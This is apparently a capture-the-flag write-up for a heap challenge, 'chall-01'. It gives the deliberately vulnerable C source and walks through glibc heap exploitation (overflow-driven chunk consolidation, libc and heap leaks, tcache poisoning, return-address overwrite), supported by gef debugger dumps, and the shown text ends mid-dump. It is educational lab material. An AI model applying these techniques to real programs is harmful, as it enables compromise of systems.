# Solution

So, this is a solution on how to solve this challenge. There are a ton of different ways to solve this challenge, with this being one way.

Do note, this solution relies on hardcoded offsets, which are a result of how the binary was compiled. Likely if you try to run this exploit against a binary you compiled, it will probably not work. You will need to swap out these offsets, in order for it to work.

## Looking at the Program

Starting off, let's take a look at the program to better understand what it is doing.

It is extremely similar to the previous challenge. We see that the Use After Free bug has been removed (when we free a chunk, it clears it out). However in it's place, we have a heap buffer overflow bug:

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include "chall-01.h"

char *chunks[10];

void main(void) {
    unsigned int menu_choice;

    while (1 == 1) {
        puts("Menu:\n1.) Allocate New Chunk\n2.) View Chunk\n3.) Edit Chunk\n4.) Free Chunk\n");
        puts("Please enter menu choice:");
        menu_choice = get_uint();

        if (menu_choice == ALLOCATE) {
            allocate_chunk();
        }

        else if (menu_choice == VIEW) {
            view_chunk();
        }

        else if (menu_choice == EDIT) {
            edit_chunk();
        }

        else if (menu_choice == FREE) {
            free_chunk();
        }

        else if (menu_choice == SECRET) {
            secret();
        }    

        else {
            printf("Unknown Menu Choice: %d\n", menu_choice);   
        }
    }
}

void you_win(void) {
    puts("Call this function to win!");

    puts("\n\nYou Win\n\n");
}

unsigned int get_uint(void) {
    char buf[20];

    fgets(buf, sizeof(buf) - 1, stdin);
    puts("");
    return (unsigned int)atoi(buf);
}

unsigned int get_chunk_idx(void) {
    unsigned chunk_idx;
    char *chunk;

    puts("Which chunk idx would you like?");
    chunk_idx = get_uint();


    if ((chunk_idx <= MAX_CHUNK_IDX)) {
        printf("You choose idx: %u\n\n", chunk_idx);
    }

    else {
        puts("Bad Chunk IDX\n");
        return -1;
    }

    chunk = chunks[chunk_idx];

    if (chunk == NULL) {
        puts("Chunk doesn't exist.\n");
        return -1;
    }

    else {
        return chunk_idx;
    }

}

void allocate_chunk(void) {
    unsigned int new_chunk_size, chunk_idx;
    char *new_chunk;

    puts("Allocating a new chunk!\n");

    printf("Enter the chunk size between 0x%x-0x%x:\n",
        MIN_CHUNK_SIZE, MAX_CHUNK_SIZE);

    new_chunk_size = get_uint();

    if ((new_chunk_size > MIN_CHUNK_SIZE) && (new_chunk_size < MAX_CHUNK_SIZE)) {
        printf("Chunk Size: 0x%x\n\n", new_chunk_size);
    }

    else {
        puts("You have inputed a bad chunks size.\n");
        return;
    }

    puts("Which chunk spot would you like to allocate?");
    chunk_idx = get_uint();

    if ((chunk_idx < MAX_CHUNK_IDX)) {
        printf("Choosen chunk idx: 0x%x\n\n", chunk_idx);
    }

    else {
        puts("Bad Chunk IDX\n");
        return;
    }

    if (chunks[chunk_idx] != NULL) {
        puts("Chunk already exists there!\n");
        return;
    }

    new_chunk = malloc(new_chunk_size);
    chunks[chunk_idx] = new_chunk;

    puts("Chunk has been allocated!\n");

}

void view_chunk(void) {
    unsigned int chunk_idx;
    char *chunk;

    puts("Viewing a chunk!\n");

    chunk_idx = get_chunk_idx();
    if (chunk_idx == -1) {
        puts("Your chunk idx is invalid.\n");
        return;
    }

    chunk = chunks[chunk_idx];

    printf("Chunk Contents: %s\x0d\x0a\n", chunk);
}

void edit_chunk(void) {
    unsigned int chunk_idx, write_size;
    char *chunk;

    puts("Editing a chunk!\n");

    printf("Enter the write size between 0x%x-0x%x:\n",
        MIN_CHUNK_SIZE, MAX_CHUNK_SIZE);

    write_size = get_uint();

    if ((write_size > MIN_CHUNK_SIZE) && (write_size < MAX_CHUNK_SIZE)) {
        printf("Write Size: 0x%x\n\n", write_size);
    }

    else {
        puts("You have inputed a bad write size.\n");
        return;
    }

    chunk_idx = get_chunk_idx();
    if (chunk_idx == -1) {
        puts("Your chunk idx is invalid.\n");
        return;
    }

    chunk = chunks[chunk_idx];

    puts("Please input new chunk content:\n");

    read(0, chunk, write_size);

    puts("\nChunk has been edited!\n");
}

void free_chunk(void) {
    unsigned int chunk_idx;
    char *chunk;

    puts("Freeing a chunk!\n");

    chunk_idx = get_chunk_idx();
    if (chunk_idx == -1) {
        puts("Your chunk idx is invalid.\n");
        return;
    }

    chunk = chunks[chunk_idx];
    free(chunk);

    chunks[chunk_idx] = NULL;

    puts("Chunk has been freed!\n");
}

void secret(void) {
    unsigned int chunk_idx, choice;
    char *chunk;
    char buf[20];

    chunk_idx = get_chunk_idx();
    if (chunk_idx == -1) {
        puts("Your chunk idx is invalid.");
        return;
    }

    chunk = chunks[chunk_idx];

    puts("Choice?");

    fgets(buf, sizeof(buf) - 1, stdin);
    choice = (unsigned int)atoi(buf);

    if (choice == 0xd3) {
        *((unsigned int **)chunk) = (&choice);
    }

    else if (choice == 0x83) {
        *((void (**)(void))chunk) = (&secret);
    }
}
```

With this being the header file:

```
#define ALLCOATE 0x00
#define ALLOCATE 0x01
#define VIEW 0x02
#define EDIT 0x03
#define FREE 0x04
#define SECRET 0x05

#define MAX_CHUNK_IDX 10
#define MAX_CHUNK_SIZE 0xff0
#define MIN_CHUNK_SIZE 0x00

void allocate_chunk();
void view_chunk();
void edit_chunk();
void free_chunk();
void secret();

unsigned int get_uint();
void you_win();
```

We see that with writes, it doesn't actually check if the size of the write is greater than the size of the chunk itself. It just checks if the size of the write is between `0x00-0xff0`. Also, we still have the secret functionality, which will give us Stack/PIE infoleaks.

So in short, we have the ability to allocate `10` chunks. We can allocate chunks, write to the chunks (which is where our bug is with the heap overflow), view the contents (as `%s`, so we get as many bytes starting from the beginning of the chunk (not counting chunk header) until we reach a null byte), free the chunks, and use the `secret` functionality.

## How will we pwn this?

So our overall process on how we will pwn this will be fairly similar to our solution to chall `00`. We will use the tcache linked list, in order to allocate a ptr to `chunks`. We will leverage that, into an arbitrary write, to write over the saved stack address of the `edit_chunk` function, from within the `edit_chunk` function, to call the `you_win` function. We will use the `secret` functionality for the needed `Stack/PIE` infoleaks.

However, we will still need a heap/libc infoleak to accomplish this (or I'm sure you could get by with just a heap infoleak, if you changed a few things). To accomplish this, I will expand a chunk, then consolidate into it, to get overlapping chunks. I will overlap a chunk in the unsorted bin, with an allocated chunk, to get the infoleaks I need. This will be the first thing I do.

To do this, I will allocate `7` chunks. The first `4` chunks will be used for the consolidation. I will consolidate chunk `3` into chunk `1`. Then I will allocate a chunk from the consolidated chunk, to get the remainder to align exactly with chunk `2`. I will use chunk `0` to overflow and edit the chunk header of chunk `1`. I will use chunk `2` to overflow and edit the chunk header of chunk `3`. I will edit the chunk header of `1` and `3` (after freeing chunk `1`, but before freeing chunk `3`), to expand the size of chunk `1` to encompass chunk `2`. Then I will free chunk `3` to cause consolidation, and then allocate a chunk of the same size as old chunk `1`, to move the start of the consolidated chunk to align directly with chunk `2`.

For the libc infoleak, I choose to view the newly allocated chunk from the consolidated chunk, which has a libc infoleak leftover from it's time in the main_arena bins. There is currently a libc pointer right where chunk `2` begins (because that is now where the consolidated chunk remainder got moved to), but it just so happens to end with a null byte, so we can't view it without editing it's least significant byte to not be null.

Proceeding that, I will free chunk `5`, to have it inserted into the unsorted bin. As a result, since the consolidated chunk that directly overlaps with chunk `2` is also in the unsorted bin, and there are only two chunks in there, the `bk` pointer of the consolidated chunk points to a heap chunk (so a heap ptr). So if we overwrite the `fd` pointer with `8` non-null characters, then view the contents of chunk `2`, we will get a heap infoleak.

Also the purpose of chunks `4` and `6`, is to prevent chunk `5` form consolidating into anything.

After that, I will go ahead and allocate four more chunks, one of size `0x20` (new chunk `5`), and then three chunks of size `0x80` (chunks 7, 8, & 9). These four chunks are directly adjacent in memory (new `5`, then `7`, then `8`, and finally `9`). Then I just go ahead, and quickly get our stack / pie infoleaks using the secret functionality.

These chunks will be used for a tcache linked list primitive. We will free chunks `9`, then `8`, and then `7`. Since they are all the same size, they will be inserted into the same tcache bin. Since we freed chunk `7` last, it is the head. We will use the `0x20` size chunk (new chunk `5`) to overwrite the next ptr for chunk `7` (via heap overflow), with a mangled next ptr to `chunks`. Then we will allocate chunk `7`, which is followed by a ptr to `chunks`. Then we use the arbitrary write, to get RCE via overwriting the saved stack return address.

Let's see this in action:

```

 . . .

$r12   : 0x00007f7305e2cac0  →  0x00000000fbad2088
$r13   : 0x00007f7305dcb2e0  →  0x0000000000000000
$r14   : 0x00007fff800c04a0  →  0x0000000000000000
$r15   : 0x12            
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
───────────────────────────────────────────────────────────────────── stack ────
0x00007fff800c03b8│+0x0000: 0x00007f7305c7a071  →  <__GI__IO_file_underflow+353> test rax, rax   ← $rsp
0x00007fff800c03c0│+0x0008: 0x00007f7305e2cac0  →  0x00000000fbad2088
0x00007fff800c03c8│+0x0010: 0x00007f7305dcb430  →  0x0000000000000000
0x00007fff800c03d0│+0x0018: 0x00007f7305e2cac0  →  0x00000000fbad2088
0x00007fff800c03d8│+0x0020: 0x0000000000000000
0x00007fff800c03e0│+0x0028: 0x00007fff800c04a0  →  0x0000000000000000
0x00007fff800c03e8│+0x0030: 0x00007f7305c7c23f  →  <_IO_default_uflow+47> cmp eax, 0xffffffff
0x00007fff800c03f0│+0x0038: 0x00007f7305dcb2e0  →  0x0000000000000000
─────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7f7305cf494b <read+11>     je  0x7f7305cf4960 <__GI___libc_read+32>
   0x7f7305cf494d <read+13>     xor eax, eax
   0x7f7305cf494f <read+15>     syscall
 → 0x7f7305cf4951 <read+17>     cmp rax, 0xfffffffffffff000
   0x7f7305cf4957 <read+23>     ja  0x7f7305cf49b0 <__GI___libc_read+112>
   0x7f7305cf4959 <read+25>     ret    
   0x7f7305cf495a <read+26>     nop WORD PTR [rax+rax*1+0x0]
   0x7f7305cf4960 <read+32>     sub rsp, 0x28
   0x7f7305cf4964 <read+36>     mov QWORD PTR [rsp+0x18], rdx
────────────────────────────────────────── source:../sysdeps/unix[...].c+26 ────
    21  
    22  /* Read NBYTES into BUF from FD.  Return the number read or -1.  */
    23  ssize_t
    24  __libc_read (int fd, void *buf, size_t nbytes)
    25  {
 →   26 return SYSCALL_CANCEL (read, fd, buf, nbytes);
    27  }
    28  libc_hidden_def (__libc_read)
    29  
    30  libc_hidden_def (__read)
    31  weak_alias (__libc_read, __read)
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall-01", stopped 0x7f7305cf4951 in __GI___libc_read (), reason: STOPPED
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7f7305cf4951 → __GI___libc_read(fd=0x0, buf=0x55a27cdee6b0, nbytes=0x1000)
[#1] 0x7f7305c7a071 → _IO_new_file_underflow(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>)
[#2] 0x7f7305c7c23f → __GI__IO_default_uflow(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>)
[#3] 0x7f7305c6f52c → __GI__IO_getline_info(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>, buf=0x7fff800c04a0 "", n=0x12, delim=0xa, extract_delim=0x1, eof=0x0)
[#4] 0x7f7305c6f62c → __GI__IO_getline(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>, buf=0x7fff800c04a0 "", n=0x12, delim=0xa, extract_delim=0x1)
[#5] 0x7f7305c6e2ee → _IO_fgets(buf=0x7fff800c04a0 "", n=0x13, fp=0x7f7305e2cac0 <_IO_2_1_stdin_>)
[#6] 0x55a27b962337 → get_uint()
[#7] 0x55a27b96225d → main()
────────────────────────────────────────────────────────────────────────────────
gef➤  c
Continuing.
^C
Program received signal SIGINT, Interrupt.
0x00007f7305cf4951 in __GI___libc_read (fd=0x0, buf=0x55a27cdee6b0, nbytes=0x1000) at ../sysdeps/unix/sysv/linux/read.c:26
26  return SYSCALL_CANCEL (read, fd, buf, nbytes);

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$rax   : 0xfffffffffffffe00
$rbx   : 0x00007f7305e2cac0  →  0x00000000fbad2088
$rcx   : 0x00007f7305cf4951  →  0x5777fffff0003d48 ("H="?)
$rdx   : 0x1000          
$rsp   : 0x00007fff800c03b8  →  0x00007f7305c7a071  →  <__GI__IO_file_underflow+353> test rax, rax
$rbp   : 0x00007f7305dcb430  →  0x0000000000000000
$rsi   : 0x000055a27cdee6b0  →  "6\n8\n\n"
$rdi   : 0x0             
$rip   : 0x00007f7305cf4951  →  0x5777fffff0003d48 ("H="?)
$r8 : 0x0            
$r9 : 0x0            
$r10   : 0x00007fff800c0267  →  0x007f7305c4f2b200
$r11   : 0x246           
$r12   : 0x00007f7305e2cac0  →  0x00000000fbad2088
$r13   : 0x00007f7305dcb2e0  →  0x0000000000000000
$r14   : 0x00007fff800c04a0  →  0x0000000000000000
$r15   : 0x12            
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
───────────────────────────────────────────────────────────────────── stack ────
0x00007fff800c03b8│+0x0000: 0x00007f7305c7a071  →  <__GI__IO_file_underflow+353> test rax, rax   ← $rsp
0x00007fff800c03c0│+0x0008: 0x00007f7305e2cac0  →  0x00000000fbad2088
0x00007fff800c03c8│+0x0010: 0x00007f7305dcb430  →  0x0000000000000000
0x00007fff800c03d0│+0x0018: 0x00007f7305e2cac0  →  0x00000000fbad2088
0x00007fff800c03d8│+0x0020: 0x000055a27cdee6b2  →  0x00000000000a0a38 ("8\n\n"?)
0x00007fff800c03e0│+0x0028: 0x00007fff800c04a0  →  0x0000000000000000
0x00007fff800c03e8│+0x0030: 0x00007f7305c7c23f  →  <_IO_default_uflow+47> cmp eax, 0xffffffff
0x00007fff800c03f0│+0x0038: 0x000055a27cdee2a0  →  "Please enter menu choice:\nnk\n2.) View Chunk\n3.)[...]"
─────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7f7305cf494b <read+11>     je  0x7f7305cf4960 <__GI___libc_read+32>
   0x7f7305cf494d <read+13>     xor eax, eax
   0x7f7305cf494f <read+15>     syscall
 → 0x7f7305cf4951 <read+17>     cmp rax, 0xfffffffffffff000
   0x7f7305cf4957 <read+23>     ja  0x7f7305cf49b0 <__GI___libc_read+112>
   0x7f7305cf4959 <read+25>     ret    
   0x7f7305cf495a <read+26>     nop WORD PTR [rax+rax*1+0x0]
   0x7f7305cf4960 <read+32>     sub rsp, 0x28
   0x7f7305cf4964 <read+36>     mov QWORD PTR [rsp+0x18], rdx
────────────────────────────────────────── source:../sysdeps/unix[...].c+26 ────
    21  
    22  /* Read NBYTES into BUF from FD.  Return the number read or -1.  */
    23  ssize_t
    24  __libc_read (int fd, void *buf, size_t nbytes)
    25  {
 →   26 return SYSCALL_CANCEL (read, fd, buf, nbytes);
    27  }
    28  libc_hidden_def (__libc_read)
    29  
    30  libc_hidden_def (__read)
    31  weak_alias (__libc_read, __read)
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall-01", stopped 0x7f7305cf4951 in __GI___libc_read (), reason: SIGINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7f7305cf4951 → __GI___libc_read(fd=0x0, buf=0x55a27cdee6b0, nbytes=0x1000)
[#1] 0x7f7305c7a071 → _IO_new_file_underflow(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>)
[#2] 0x7f7305c7c23f → __GI__IO_default_uflow(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>)
[#3] 0x7f7305c6f52c → __GI__IO_getline_info(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>, buf=0x7fff800c04a0 "", n=0x12, delim=0xa, extract_delim=0x1, eof=0x0)
[#4] 0x7f7305c6f62c → __GI__IO_getline(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>, buf=0x7fff800c04a0 "", n=0x12, delim=0xa, extract_delim=0x1)
[#5] 0x7f7305c6e2ee → _IO_fgets(buf=0x7fff800c04a0 "", n=0x13, fp=0x7f7305e2cac0 <_IO_2_1_stdin_>)
[#6] 0x55a27b962337 → get_uint()
[#7] 0x55a27b96225d → main()
────────────────────────────────────────────────────────────────────────────────
gef➤  p (char *)chunks
$1 = 0x55a27cdef6c0 ""
gef➤  search-pattern 0x55a27cdef6c0
[+] Searching '\xc0\xf6\xde\x7c\xa2\x55' in memory
[+] In '/Hackery/shogun/challs/01/chall-01'(0x55a27b965000-0x55a27b966000), permission=rw-
  0x55a27b965040 - 0x55a27b965058  →   "\xc0\xf6\xde\x7c\xa2\x55[...]"
gef➤  x/10g 0x55a27b965040
0x55a27b965040 <chunks>:    0x55a27cdef6c0  0x55a27cdef6f0
0x55a27b965050 <chunks+16>: 0x55a27cdefc00  0x55a27cdefc90
0x55a27b965060 <chunks+32>: 0x55a27cdf01a0  0x55a27cdf0230
0x55a27b965070 <chunks+48>: 0x55a27cdf0740  0x0
0x55a27b965080 <chunks+64>: 0x0 0x0
gef➤  x/20g 0x55a27cdef6c0
0x55a27cdef6c0: 0x0 0x0
0x55a27cdef6d0: 0x0 0x0
0x55a27cdef6e0: 0x0 0x511
0x55a27cdef6f0: 0x0 0x0
0x55a27cdef700: 0x0 0x0
0x55a27cdef710: 0x0 0x0
0x55a27cdef720: 0x0 0x0
0x55a27cdef730: 0x0 0x0
0x55a27cdef740: 0x0 0x0
0x55a27cdef750: 0x0 0x0
gef➤  x/40g 0x55a27cdefbf0
0x55a27cdefbf0: 0x0 0x91
0x55a27cdefc00: 0x0 0x0
0x55a27cdefc10: 0x0 0x0
0x55a27cdefc20: 0x0 0x0
0x55a27cdefc30: 0x0 0x0
0x55a27cdefc40: 0x0 0x0
0x55a27cdefc50: 0x0 0x0
0x55a27cdefc60: 0x0 0x0
0x55a27cdefc70: 0x0 0x0
0x55a27cdefc80: 0x0 0x511
0x55a27cdefc90: 0x0 0x0
0x55a27cdefca0: 0x0 0x0
0x55a27cdefcb0: 0x0 0x0
0x55a27cdefcc0: 0x0 0x0
0x55a27cdefcd0: 0x0 0x0
0x55a27cdefce0: 0x0 0x0
0x55a27cdefcf0: 0x0 0x0
0x55a27cdefd00: 0x0 0x0
0x55a27cdefd10: 0x0 0x0
0x55a27cdefd20: 0x0 0x0
gef➤  c
Continuing.
```

So we start off, we see our beginning chunks laid out for consolidation. We will be consolidating the `0x55a27cdefc80` into the `0x55a27cdef6e0`. This will encompass the `0x55a27cdefbf0` chunk in the  free consolidated chunk, so we can later allocate overlapping chunks.

Let's see what happens, after we have executed overflows to overwrite the chunk headers for `0x55a27cdef6e0/0x55a27cdefc80`:

```
^C
Program received signal SIGINT, Interrupt.
0x00007f7305cf4951 in __GI___libc_read (fd=0x0, buf=0x55a27cdee6b0, nbytes=0x1000) at ../sysdeps/unix/sysv/linux/read.c:26
26  return SYSCALL_CANCEL (read, fd, buf, nbytes);

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xfffffffffffffe00
$rbx   : 0x00007f7305e2cac0  →  0x00000000fbad2088
$rcx   : 0x00007f7305cf4951  →  0x5777fffff0003d48 ("H="?)
$rdx   : 0x1000          
$rsp   : 0x00007fff800c03b8  →  0x00007f7305c7a071  →  <__GI__IO_file_underflow+353> test rax, rax
$rbp   : 0x00007f7305dcb430  →  0x0000000000000000
$rsi   : 0x000055a27cdee6b0  →  "\n\n4\n\n"
$rdi   : 0x0             
$rip   : 0x00007f7305cf4951  →  0x5777fffff0003d48 ("H="?)
$r8 : 0x0            
$r9 : 0x0            
$r10   : 0x00007fff800c0287  →  0x007f7305c4f2b200
$r11   : 0x246           
$r12   : 0x00007f7305e2cac0  →  0x00000000fbad2088
$r13   : 0x00007f7305dcb2e0  →  0x0000000000000000
$r14   : 0x00007fff800c04a0  →  0x0000000000000000
$r15   : 0x12            
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fff800c03b8│+0x0000: 0x00007f7305c7a071  →  <__GI__IO_file_underflow+353> test rax, rax   ← $rsp
0x00007fff800c03c0│+0x0008: 0x00007f7305e2cac0  →  0x00000000fbad2088
0x00007fff800c03c8│+0x0010: 0x00007f7305dcb430  →  0x0000000000000000
0x00007fff800c03d0│+0x0018: 0x00007f7305e2cac0  →  0x00000000fbad2088
0x00007fff800c03d8│+0x0020: 0x000055a27cdee6b1  →  0x000000000a0a340a ("\n4\n\n"?)
0x00007fff800c03e0│+0x0028: 0x00007fff800c04a0  →  0x0000000000000000
0x00007fff800c03e8│+0x0030: 0x00007f7305c7c23f  →  <_IO_default_uflow+47> cmp eax, 0xffffffff
0x00007fff800c03f0│+0x0038: 0x000055a27cdee2a0  →  "Please enter menu choice:\nnk\n2.) View Chunk\n3.)[...]"
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7f7305cf494b <read+11>     je  0x7f7305cf4960 <__GI___libc_read+32>
   0x7f7305cf494d <read+13>     xor eax, eax
   0x7f7305cf494f <read+15>     syscall
 → 0x7f7305cf4951 <read+17>     cmp rax, 0xfffffffffffff000
   0x7f7305cf4957 <read+23>     ja  0x7f7305cf49b0 <__GI___libc_read+112>
   0x7f7305cf4959 <read+25>     ret    
   0x7f7305cf495a <read+26>     nop WORD PTR [rax+rax*1+0x0]
   0x7f7305cf4960 <read+32>     sub rsp, 0x28
   0x7f7305cf4964 <read+36>     mov QWORD PTR [rsp+0x18], rdx
─────────────────────────────────────────────────────────────── source:../sysdeps/unix[...].c+26 ────
    21  
    22  /* Read NBYTES into BUF from FD.  Return the number read or -1.  */
    23  ssize_t
    24  __libc_read (int fd, void *buf, size_t nbytes)
    25  {
 →   26 return SYSCALL_CANCEL (read, fd, buf, nbytes);
    27  }
    28  libc_hidden_def (__libc_read)
    29  
    30  libc_hidden_def (__read)
    31  weak_alias (__libc_read, __read)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall-01", stopped 0x7f7305cf4951 in __GI___libc_read (), reason: SIGINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7f7305cf4951 → __GI___libc_read(fd=0x0, buf=0x55a27cdee6b0, nbytes=0x1000)
[#1] 0x7f7305c7a071 → _IO_new_file_underflow(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>)
[#2] 0x7f7305c7c23f → __GI__IO_default_uflow(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>)
[#3] 0x7f7305c6f52c → __GI__IO_getline_info(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>, buf=0x7fff800c04a0 "", n=0x12, delim=0xa, extract_delim=0x1, eof=0x0)
[#4] 0x7f7305c6f62c → __GI__IO_getline(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>, buf=0x7fff800c04a0 "", n=0x12, delim=0xa, extract_delim=0x1)
[#5] 0x7f7305c6e2ee → _IO_fgets(buf=0x7fff800c04a0 "", n=0x13, fp=0x7f7305e2cac0 <_IO_2_1_stdin_>)
[#6] 0x55a27b962337 → get_uint()
[#7] 0x55a27b96225d → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/40g 0x55a27cdef6b0
0x55a27cdef6b0: 0x0 0x31
0x55a27cdef6c0: 0x3131313131313131  0x3131313131313131
0x55a27cdef6d0: 0x3131313131313131  0x3131313131313131
0x55a27cdef6e0: 0x0 0x5a0
0x55a27cdef6f0: 0x7f7305e2cd00  0x7f7305e2cd00
0x55a27cdef700: 0x0 0x0
0x55a27cdef710: 0x0 0x0
0x55a27cdef720: 0x0 0x0
0x55a27cdef730: 0x0 0x0
0x55a27cdef740: 0x0 0x0
0x55a27cdef750: 0x0 0x0
0x55a27cdef760: 0x0 0x0
0x55a27cdef770: 0x0 0x0
0x55a27cdef780: 0x0 0x0
0x55a27cdef790: 0x0 0x0
0x55a27cdef7a0: 0x0 0x0
0x55a27cdef7b0: 0x0 0x0
0x55a27cdef7c0: 0x0 0x0
0x55a27cdef7d0: 0x0 0x0
0x55a27cdef7e0: 0x0 0x0
gef➤  x/40g 0x55a27cdefbf0
0x55a27cdefbf0: 0x510   0x90
0x55a27cdefc00: 0x3030303030303030  0x3030303030303030
0x55a27cdefc10: 0x3030303030303030  0x3030303030303030
0x55a27cdefc20: 0x3030303030303030  0x3030303030303030
0x55a27cdefc30: 0x3030303030303030  0x3030303030303030
0x55a27cdefc40: 0x3030303030303030  0x3030303030303030
0x55a27cdefc50: 0x3030303030303030  0x3030303030303030
0x55a27cdefc60: 0x3030303030303030  0x3030303030303030
0x55a27cdefc70: 0x3030303030303030  0x3030303030303030
0x55a27cdefc80: 0x5a0   0x510
0x55a27cdefc90: 0x0 0x0
0x55a27cdefca0: 0x0 0x0
0x55a27cdefcb0: 0x0 0x0
0x55a27cdefcc0: 0x0 0x0
0x55a27cdefcd0: 0x0 0x0
0x55a27cdefce0: 0x0 0x0
0x55a27cdefcf0: 0x0 0x0
0x55a27cdefd00: 0x0 0x0
0x55a27cdefd10: 0x0 0x0
0x55a27cdefd20: 0x0 0x0
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
All tcachebins are empty
─────────────────────────────── Fastbins for arena at 0x7f7305e2cca0 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7f7305e2cca0 ─────────────────────────────
[+] unsorted_bins[0]: fw=0x55a27cdef6e0, bk=0x55a27cdef6e0
 →   Chunk(addr=0x55a27cdef6f0, size=0x5a0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 1 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7f7305e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7f7305e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  c
Continuing.
```

So we see the `0x55a27cdefc80/0x55a27cdef6f0` chunk headers have been overflowed to expand the chunksize of `0x55a27cdef6f0` for consolidation, and that the `0x55a27cdef6f0` chunk has been freed. Now, we just need to free the `0x55a27cdefc80` chunk, to cause consolidation:


```
^C
Program received signal SIGINT, Interrupt.
0x00007f7305cf4951 in __GI___libc_read (fd=0x0, buf=0x55a27cdee6b0, nbytes=0x1000) at ../sysdeps/unix/sysv/linux/read.c:26
26  return SYSCALL_CANCEL (read, fd, buf, nbytes);

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xfffffffffffffe00
$rbx   : 0x00007f7305e2cac0  →  0x00000000fbad2088
$rcx   : 0x00007f7305cf4951  →  0x5777fffff0003d48 ("H="?)
$rdx   : 0x1000          
$rsp   : 0x00007fff800c03b8  →  0x00007f7305c7a071  →  <__GI__IO_file_underflow+353> test rax, rax
$rbp   : 0x00007f7305dcb430  →  0x0000000000000000
$rsi   : 0x000055a27cdee6b0  →  "3\n4\n\n"
$rdi   : 0x0             
$rip   : 0x00007f7305cf4951  →  0x5777fffff0003d48 ("H="?)
$r8 : 0x0            
$r9 : 0x0            
$r10   : 0x00007fff800c0247  →  0x007f7305c4f2b200
$r11   : 0x246           
$r12   : 0x00007f7305e2cac0  →  0x00000000fbad2088
$r13   : 0x00007f7305dcb2e0  →  0x0000000000000000
$r14   : 0x00007fff800c04a0  →  0x0000000000000000
$r15   : 0x12            
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fff800c03b8│+0x0000: 0x00007f7305c7a071  →  <__GI__IO_file_underflow+353> test rax, rax   ← $rsp
0x00007fff800c03c0│+0x0008: 0x00007f7305e2cac0  →  0x00000000fbad2088
0x00007fff800c03c8│+0x0010: 0x00007f7305dcb430  →  0x0000000000000000
0x00007fff800c03d0│+0x0018: 0x00007f7305e2cac0  →  0x00000000fbad2088
0x00007fff800c03d8│+0x0020: 0x000055a27cdee6b2  →  0x00000000000a0a34 ("4\n\n"?)
0x00007fff800c03e0│+0x0028: 0x00007fff800c04a0  →  0x0000000000000000
0x00007fff800c03e8│+0x0030: 0x00007f7305c7c23f  →  <_IO_default_uflow+47> cmp eax, 0xffffffff
0x00007fff800c03f0│+0x0038: 0x000055a27cdee2a0  →  "Please enter menu choice:\nnk\n2.) View Chunk\n3.)[...]"
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7f7305cf494b <read+11>     je  0x7f7305cf4960 <__GI___libc_read+32>
   0x7f7305cf494d <read+13>     xor eax, eax
   0x7f7305cf494f <read+15>     syscall
 → 0x7f7305cf4951 <read+17>     cmp rax, 0xfffffffffffff000
   0x7f7305cf4957 <read+23>     ja  0x7f7305cf49b0 <__GI___libc_read+112>
   0x7f7305cf4959 <read+25>     ret    
   0x7f7305cf495a <read+26>     nop WORD PTR [rax+rax*1+0x0]
   0x7f7305cf4960 <read+32>     sub rsp, 0x28
   0x7f7305cf4964 <read+36>     mov QWORD PTR [rsp+0x18], rdx
─────────────────────────────────────────────────────────────── source:../sysdeps/unix[...].c+26 ────
    21  
    22  /* Read NBYTES into BUF from FD.  Return the number read or -1.  */
    23  ssize_t
    24  __libc_read (int fd, void *buf, size_t nbytes)
    25  {
